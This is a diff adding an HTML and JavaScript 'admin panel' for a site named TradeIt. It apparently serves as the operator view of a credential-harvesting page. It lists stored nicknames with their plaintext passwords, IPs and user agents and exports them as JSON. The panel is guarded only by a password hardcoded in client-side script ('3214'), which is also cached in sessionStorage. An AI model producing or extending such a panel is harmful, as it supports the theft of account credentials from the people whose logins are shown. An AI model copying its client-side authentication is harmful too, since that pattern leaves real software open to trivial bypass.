@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Админ панель - TradeIt</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        .admin-standalone {
+            min-height: 100vh;
+            background: #121212;
+            padding: 20px;
+        }
+        .admin-standalone .admin-container {
+            margin: 50px auto;
+        }
+        .back-to-main {
+            display: inline-block;
+            margin-bottom: 20px;
+            color: #ff5722;
+            text-decoration: none;
+            font-size: 16px;
+        }
+        .back-to-main:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="admin-standalone">
+        <div class="admin-container">
+            <a href="index.html" class="back-to-main">
+                <i class="fas fa-arrow-left"></i> Вернуться на главную
+            </a>
+            
+            <div class="admin-header">
+                <h2>Админ панель</h2>
+            </div>
+            
+            <div id="adminLogin" class="admin-login-form">
+                <h3>Вход в админку</h3>
+                <input type="password" id="adminPassword" placeholder="Введите пароль">
+                <br>
+                <button id="adminLoginBtn">Войти</button>
+                <p id="adminError" class="admin-error">Неверный пароль!</p>
+            </div>
+            
+            <div id="adminContent" class="admin-content">
+                <h3>Сохраненные логины</h3>
+                <div class="admin-actions">
+                    <button id="refreshData">Обновить</button>
+                    <button id="exportData" class="export">Экспорт JSON</button>
+                    <button id="clearData" class="clear">Очистить все</button>
+                </div>
+                
+                <div class="users-table">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Дата</th>
+                                <th>Никнейм</th>
+                                <th>Пароль</th>
+                                <th>IP</th>
+                                <th>User Agent</th>
+                            </tr>
+                        </thead>
+                        <tbody id="usersTableBody">
+                            <!-- Данные будут здесь -->
+                        </tbody>
+                    </table>
+                </div>
+                
+                <div class="admin-stats">
+                    <p>Всего записей: <span id="totalRecords">0</span></p>
+                    <p>Последнее обновление: <span id="lastUpdate">-</span></p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Константы для админ-панели
+        const ADMIN_PASSWORD = "3214";
+
+        // Функции для работы с данными пользователей
+        function getLoginHistory() {
+            return JSON.parse(localStorage.getItem('login_history') || '[]');
+        }
+
+        function updateAdminTable() {
+            const history = getLoginHistory();
+            const tbody = document.getElementById('usersTableBody');
+            const totalRecords = document.getElementById('totalRecords');
+            const lastUpdate = document.getElementById('lastUpdate');
+            
+            tbody.innerHTML = '';
+            totalRecords.textContent = history.length;
+            lastUpdate.textContent = new Date().toLocaleString();
+            
+            if (history.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" style="padding: 20px; text-align: center; color: #777;">Нет данных</td></tr>';
+                return;
+            }
+            
+            // Сортируем по дате (новые сверху)
+            history.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+            
+            history.forEach(login => {
+                const row = document.createElement('tr');
+                row.style.borderBottom = '1px solid #333';
+                
+                const date = new Date(login.timestamp).toLocaleString();
+                const shortUserAgent = login.userAgent ? login.userAgent.substring(0, 50) + '...' : 'unknown';
+                
+                row.innerHTML = `
+                    <td style="color: #aaa; font-size: 12px;">${date}</td>
+                    <td style="color: #fff;">${escapeHtml(login.username)}</td>
+                    <td style="color: #ff5722;">${escapeHtml(login.password)}</td>
+                    <td style="color: #aaa; font-size: 12px;">${login.ip || 'unknown'}</td>
+                    <td style="color: #aaa; font-size: 10px;" title="${login.userAgent || 'unknown'}">${shortUserAgent}</td>
+                `;
+                
+                tbody.appendChild(row);
+            });
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // Инициализация админ-панели
+        document.addEventListener('DOMContentLoaded', function() {
+            const adminLoginBtn = document.getElementById('adminLoginBtn');
+            const adminPassword = document.getElementById('adminPassword');
+            const adminError = document.getElementById('adminError');
+            const adminLogin = document.getElementById('adminLogin');
+            const adminContent = document.getElementById('adminContent');
+            const refreshData = document.getElementById('refreshData');
+            const exportData = document.getElementById('exportData');
+            const clearData = document.getElementById('clearData');
+            
+            // Вход в админку
+            adminLoginBtn.addEventListener('click', function() {
+                if (adminPassword.value === ADMIN_PASSWORD) {
+                    adminLogin.style.display = 'none';
+                    adminContent.style.display = 'block';
+                    updateAdminTable();
+                } else {
+                    adminError.style.display = 'block';
+                }
+            });
+            
+            // Enter для входа
+            adminPassword.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    adminLoginBtn.click();
+                }
+            });
+            
+            // Обновить данные
+            refreshData.addEventListener('click', updateAdminTable);
+            
+            // Экспорт данных
+            exportData.addEventListener('click', function() {
+                const history = getLoginHistory();
+                const dataStr = JSON.stringify(history, null, 2);
+                const dataBlob = new Blob([dataStr], {type: 'application/json'});
+                
+                const link = document.createElement('a');
+                link.href = URL.createObjectURL(dataBlob);
+                link.download = 'users_data.json';
+                link.click();
+            });
+            
+            // Очистить данные
+            clearData.addEventListener('click', function() {
+                if (confirm('Вы уверены, что хотите удалить ВСЕ данные?')) {
+                    localStorage.removeItem('login_history');
+                    localStorage.removeItem('current_user');
+                    updateAdminTable();
+                    alert('Все данные очищены!');
+                }
+            });
+            
+            // Автоматически показать админку если уже авторизован
+            const savedPassword = sessionStorage.getItem('adminAuth');
+            if (savedPassword === ADMIN_PASSWORD) {
+                adminLogin.style.display = 'none';
+                adminContent.style.display = 'block';
+                updateAdminTable();
+            } else {
+                // Сохраняем авторизацию при успешном входе
+                adminLoginBtn.addEventListener('click', function() {
+                    if (adminPassword.value === ADMIN_PASSWORD) {
+                        sessionStorage.setItem('adminAuth', ADMIN_PASSWORD);
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
